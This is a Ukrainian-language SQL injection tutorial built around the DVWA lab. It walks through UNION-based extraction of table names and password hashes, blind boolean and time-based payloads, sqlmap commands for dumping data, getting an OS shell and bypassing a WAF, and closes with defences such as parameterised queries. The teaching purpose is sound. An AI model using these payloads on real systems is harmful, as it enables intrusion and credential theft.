Ручна SQL ін'єкція: покроково

Мета: від виявлення вразливості до вилучення всіх даних з бази. Працюємо на DVWA (Damn Vulnerable Web Application).
1. Знайти точку
→
2. Визначити стовпці
→
3. Знайти таблиці
→
4. Вилучити дані
# 1. Перевірка на вразливість
GET /user?id=1' → SQL error = вразливий!
GET /user?id=1' AND '1'='1 → нормальна відповідь
GET /user?id=1' AND '1'='2 → порожня відповідь

# 2. Визначення кількості стовпців (ORDER BY)
GET /user?id=1' ORDER BY 1-- → OK
GET /user?id=1' ORDER BY 2-- → OK
GET /user?id=1' ORDER BY 3-- → OK
GET /user?id=1' ORDER BY 4-- → ERROR! → 3 стовпці

# 3. Знайти стовпець, що відображається
GET /user?id=-1' UNION SELECT 1,2,3--
# → на сторінці видно "2" і "3" → позиції для вилучення

UNION-based SQLi: вилучення даних

# 4. Версія БД та поточна база
GET /user?id=-1' UNION SELECT 1,version(),database()--
# → MySQL 8.0.32, dvwa

# 5. Список всіх таблиць
GET /user?id=-1' UNION SELECT 1,2,group_concat(table_name)
  FROM information_schema.tables
  WHERE table_schema='dvwa'--
# → users,guestbook

# 6. Стовпці таблиці users
GET /user?id=-1' UNION SELECT 1,2,group_concat(column_name)
  FROM information_schema.columns
  WHERE table_name='users'--
# → user_id,first_name,last_name,user,password

# 7. Дамп даних!
GET /user?id=-1' UNION SELECT 1,
  group_concat(user,':',password SEPARATOR '<br>'),3
  FROM users--
# → admin:5f4dcc3b5aa765d..., gordonb:e99a18c4...
information_schema — системна база MySQL/PostgreSQL з метаданими всіх таблиць і стовпців. Ключ до повної компрометації!

Blind SQLi та SQLMap

Blind SQL Injection

Коли результат НЕ відображається на сторінці

Boolean-based: різна відповідь для true/false

# Boolean-based
id=1' AND SUBSTRING(database(),1,1)='d'--
# → true (нормальна сторінка)
id=1' AND SUBSTRING(database(),1,1)='a'--
# → false (інша/порожня сторінка)

# Time-based
id=1' AND IF(SUBSTRING(database(),1,1)='d',
  SLEEP(5),0)--
# → затримка 5 сек = true

Повільно: 1 символ за раз → автоматизація!

SQLMap — автоматизація

# Автовиявлення SQLi
sqlmap -u "http://target/page?id=1"

# Список баз даних
sqlmap -u "http://target/page?id=1" --dbs

# Таблиці конкретної бази
sqlmap -u "..." -D dvwa --tables

# Дамп таблиці
sqlmap -u "..." -D dvwa -T users --dump

# POST запит
sqlmap -u "http://target/login" \
  --data="user=admin&pass=test"

# З cookie
sqlmap -u "..." --cookie="PHPSESSID=abc"

# Отримання shell
sqlmap -u "..." --os-shell

Ключові опції: --risk (1-3), --level (1-5), --tamper (bypass WAF)

Захист від SQLi та навчальні платформи

Захист

✓ Prepared statements / Parameterized queries (ЗАВЖДИ)
✓ ORM (Django, SQLAlchemy, Hibernate)
✓ Input validation (whitelist)
✓ Принцип мінімальних привілеїв для DB user
✓ WAF (Web Application Firewall)
✓ Stored procedures (з обмеженнями)
✓ Відключити detailed error messages
# НЕБЕЗПЕЧНО (конкатенація)
query = f"SELECT * FROM users WHERE id='{id}'"

# БЕЗПЕЧНО (параметризований запит)
cursor.execute("SELECT * FROM users WHERE id=%s", [id])
